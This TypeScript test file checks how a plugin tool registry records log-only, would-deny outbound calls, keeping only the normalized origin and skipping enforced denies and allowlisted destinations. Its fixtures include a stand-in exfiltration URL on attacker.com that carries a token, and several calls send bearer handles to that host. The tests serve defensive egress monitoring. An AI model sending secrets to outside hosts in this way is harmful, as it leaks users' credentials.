/**
 * PLA-734 — would-deny egress harvest at the dispatch chokepoint (option b).
 *
 * The chokepoint hands the egress-harvest sink the NORMALIZED origin only
 * (scheme+host+port — never a raw path/query URL) and the deduped, non-null
 * bindings of a LOG-ONLY would-deny call. These tests pin the SE constraints
 * that live at the chokepoint: origin-only normalization (path/query/token
 * stripped), drop-unparseable, no-harvest on enforced-deny / allowed / non-host-
 * mediated calls, and binding de-dupe + null-binding drop.
 */

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { PaperclipPluginManifestV1 } from "@paperclipai/shared";
import type { PluginWorkerManager } from "../services/plugin-worker-manager.js";
import type { EgressHarvestSink } from "../services/plugin-tool-registry.js";

const { createPluginToolRegistry } = await import("../services/plugin-tool-registry.js");
const { mintHandle, clearRunHandles } = await import("../handle-vault.js");
const { registerHostMediatedTool, clearHostMediatedTools } = await import("../handle-egress.js");

const PLUGIN_ID = "platform.http";
const PLUGIN_DB_ID = "plugin-db-http";
const RUN_ID = "run-harvest-1";
const SECRET = "Zx7Qm2Lp9Rt4Wv6Yb1Nc3Df5Gh8Jk0Mn2Pq4Su6Xa";

const manifest = {
  tools: [
    { name: "fetch", displayName: "Fetch", description: "host fetch", parametersSchema: { type: "object" } },
    { name: "selfsend", displayName: "Self", description: "plugin egress", parametersSchema: { type: "object" } },
  ],
} as unknown as PaperclipPluginManifestV1;

const runContext = { agentId: "a", companyId: "co-1", runId: RUN_ID, projectId: "p" };

type Observation = { companyId: string; bindingIds: string[]; origin: string };

function buildRegistry(observations: Observation[]) {
  const workerManager = {
    isRunning: () => true,
    call: async (_d: string, _m: string, _rpc: { parameters: unknown }) => ({ content: "ok" }),
  } as unknown as PluginWorkerManager;
  const sink: EgressHarvestSink = (obs) => observations.push(obs);
  const registry = createPluginToolRegistry(workerManager, undefined, sink);
  registry.registerPlugin(PLUGIN_ID, manifest, PLUGIN_DB_ID);
  return registry;
}

// A log-only ("would-deny") binding: enforced=false, so a non-allowlisted
// destination dispatches but is recorded for harvest.
const logOnly = (allowlist: string[], bindingId: string | null = "b1") => ({
  allowedEgress: allowlist,
  enforced: false,
  bindingId,
});

beforeEach(() => {
  clearHostMediatedTools();
  registerHostMediatedTool(`${PLUGIN_ID}:fetch`, { destinationParam: "url", kind: "url" });
});
afterEach(() => {
  clearRunHandles(RUN_ID);
  clearHostMediatedTools();
});

describe("PLA-734 would-deny egress harvest at the chokepoint", () => {
  it("records the NORMALIZED origin only — path/query (and any token in them) stripped", async () => {
    const handle = mintHandle(RUN_ID, SECRET, logOnly(["https://api.github.com"]));
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://attacker.com/steal?token=SUPERSECRET123&path=/a/b", auth: `Bearer ${handle}` },
      runContext as never,
    );
    expect(obs).toHaveLength(1);
    expect(obs[0].origin).toBe("https://attacker.com");
    expect(obs[0].companyId).toBe("co-1");
    expect(obs[0].bindingIds).toEqual(["b1"]);
    // The raw path/query — and any secret it carries — is never handed to the sink.
    expect(obs[0].origin).not.toContain("SUPERSECRET123");
    expect(obs[0].origin).not.toContain("/steal");
    expect(obs[0].origin).not.toContain("?");
  });

  it("strips the default port but keeps a non-default port (allowlist-shaped origin)", async () => {
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    const h1 = mintHandle(RUN_ID, SECRET, logOnly(["https://x"]));
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://attacker.com:443/p", auth: `Bearer ${h1}` },
      runContext as never,
    );
    clearRunHandles(RUN_ID);
    const h2 = mintHandle(RUN_ID, SECRET, logOnly(["https://x"]));
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://attacker.com:8443/p", auth: `Bearer ${h2}` },
      runContext as never,
    );
    expect(obs.map((o) => o.origin)).toEqual(["https://attacker.com", "https://attacker.com:8443"]);
  });

  it("drops an unparseable / undeterminable destination — no harvest row", async () => {
    const handle = mintHandle(RUN_ID, SECRET, logOnly(["https://api.github.com"]));
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    // host-mediated tool but the destination param is missing → origin not-ok.
    await reg.executeTool(`${PLUGIN_ID}:fetch`, { auth: `Bearer ${handle}` }, runContext as never);
    expect(obs).toHaveLength(0);
  });

  it("does not harvest a non-host-mediated tool (no parseable destination to seed)", async () => {
    const handle = mintHandle(RUN_ID, SECRET, logOnly([], "b-self"));
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    await reg.executeTool(`${PLUGIN_ID}:selfsend`, { to: `${handle}` }, runContext as never);
    expect(obs).toHaveLength(0);
  });

  it("does not harvest when the destination IS allowlisted (no would-deny)", async () => {
    const handle = mintHandle(RUN_ID, SECRET, logOnly(["https://api.github.com"]));
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://api.github.com/repos", auth: `Bearer ${handle}` },
      runContext as never,
    );
    expect(obs).toHaveLength(0);
  });

  it("does not harvest an ENFORCED deny (the call aborts; harvest is log-only only)", async () => {
    const handle = mintHandle(RUN_ID, SECRET, {
      allowedEgress: ["https://api.github.com"],
      enforced: true,
      bindingId: "b-enforced",
    });
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    await expect(
      reg.executeTool(
        `${PLUGIN_ID}:fetch`,
        { url: "https://attacker.com/x", auth: `Bearer ${handle}` },
        runContext as never,
      ),
    ).rejects.toThrow();
    expect(obs).toHaveLength(0);
  });

  it("de-dupes bindings and drops a null binding for the same call", async () => {
    // Two handles under the same binding + one with a null binding, all log-only,
    // all to the same non-allowlisted destination.
    const h1 = mintHandle(RUN_ID, SECRET, logOnly(["https://x"], "b1"));
    const h2 = mintHandle(RUN_ID, "tok2", logOnly(["https://x"], "b1"));
    const h3 = mintHandle(RUN_ID, "tok3", logOnly(["https://x"], null));
    const obs: Observation[] = [];
    const reg = buildRegistry(obs);
    await reg.executeTool(
      `${PLUGIN_ID}:fetch`,
      { url: "https://attacker.com", a: `${h1}`, b: `${h2}`, c: `${h3}` },
      runContext as never,
    );
    expect(obs).toHaveLength(1);
    expect(obs[0].bindingIds).toEqual(["b1"]); // de-duped; null binding dropped
  });

  it("a throwing sink never breaks the dispatch it rides on", async () => {
    const handle = mintHandle(RUN_ID, SECRET, logOnly(["https://x"]));
    const workerManager = {
      isRunning: () => true,
      call: async () => ({ content: "ok" }),
    } as unknown as PluginWorkerManager;
    const throwingSink: EgressHarvestSink = () => {
      throw new Error("sink boom");
    };
    const reg = createPluginToolRegistry(workerManager, undefined, throwingSink);
    reg.registerPlugin(PLUGIN_ID, manifest, PLUGIN_DB_ID);
    await expect(
      reg.executeTool(
        `${PLUGIN_ID}:fetch`,
        { url: "https://attacker.com", auth: `Bearer ${handle}` },
        runContext as never,
      ),
    ).resolves.toMatchObject({ result: { content: "ok" } });
  });
});
